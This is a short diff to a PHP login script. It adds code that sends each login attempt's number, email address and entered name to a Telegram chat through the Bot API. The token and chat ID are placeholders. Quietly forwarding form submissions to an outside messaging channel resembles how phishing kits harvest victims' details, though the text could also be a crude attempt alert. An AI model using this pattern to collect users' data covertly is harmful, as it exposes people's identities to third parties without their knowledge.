@@ -2,6 +2,10 @@
 session_start();
 define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');
 
+// Telegram config
+$telegramBotToken = "YOUR_BOT_TOKEN";
+$telegramChatId   = "YOUR_CHAT_ID";
+
 // Ensure attempts.json exists
 if (!file_exists(ATTEMPTS_FILE)) {
     file_put_contents(ATTEMPTS_FILE, json_encode([], JSON_PRETTY_PRINT));
@@ -37,7 +41,13 @@ if (!isset($attempts[$email])) {
 // Save attempts
 file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
 
+// --- Telegram notification ---
 $attempt_number = $attempts[$email]['count'];
+$message = "Login attempt #{$attempt_number}\nEmail: {$email}\nName entered: {$name}";
+$telegramUrl = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";
+file_get_contents($telegramUrl . "?chat_id={$telegramChatId}&text=" . urlencode($message));
+// --------------------------------
+
 $correct_name = "John Doe"; // replace with your actual correct name
 
 if ($name !== $correct_name && $attempt_number < 3) {
